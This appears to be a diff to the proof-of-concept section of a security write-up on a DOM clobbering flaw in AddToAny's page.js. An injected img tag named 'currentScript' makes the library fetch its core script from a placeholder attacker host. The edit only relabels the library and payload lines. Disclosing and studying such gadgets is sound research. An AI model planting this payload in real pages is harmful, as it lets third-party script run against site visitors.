@@ -37,6 +37,11 @@ c(e + "core" + g + ".js", !0);
 ## PoC
 
 ```
-<img src="https://addtoany.xxx.xxx" name="currentScript">
+<!--Library-->
 <script async src="https://static.addtoany.com/menu/page.js"></script>
+<!--Library-->
+
+<!--Payload-->
+<img src="https://addtoany.xxx.xxx" name="currentScript">
+<!--Payload-->
 ```
